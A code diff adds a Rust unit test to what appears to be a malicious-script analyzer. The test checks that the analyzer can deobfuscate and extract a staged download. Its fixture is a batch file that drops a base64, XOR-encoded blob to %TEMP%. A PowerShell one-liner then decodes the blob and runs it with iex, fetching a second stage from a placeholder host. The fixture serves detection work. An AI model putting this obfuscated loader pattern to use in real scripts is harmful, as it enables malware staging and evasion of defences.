@@ -13728,6 +13728,37 @@ exit
     }
 
     #[test]
+    fn ps1_file_backed_base64_xor_loader_accepts_get_content_literal_path_parameter() {
+        use base64::Engine;
+        let payload = "Invoke-WebRequest -Uri https://xorloader-literal-path.example/stage.ps1";
+        let encrypted: Vec<u8> = payload
+            .encode_utf16()
+            .flat_map(|u| u.to_le_bytes())
+            .map(|b| b ^ 253)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\necho {b64} > \"%TEMP%\\\\stage.dat\"\r\npowershell -NoP -C \"$k=253;$d=Get-Content -LiteralPath 'STAGE.DAT' -Raw;$b=[Convert]::FromBase64String($d);$x=0..($b.Length-1)|%{{$b[$_]-bxor$k}};$s=[Text.Encoding]::Unicode.GetString($x);iex $s\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://xorloader-literal-path.example/stage.ps1")),
+            "Get-Content -LiteralPath file-backed xor stage was not normalized:\n{:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src.contains("xorloader-literal-path.example/stage.ps1"))
+            }),
+            "Get-Content -LiteralPath file-backed xor stage URL was not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn ps1_sorted_comment_chunks_are_extracted() {
         let script = concat!(
             ":: 030000000002eadable.example/a.ps1\r\n",
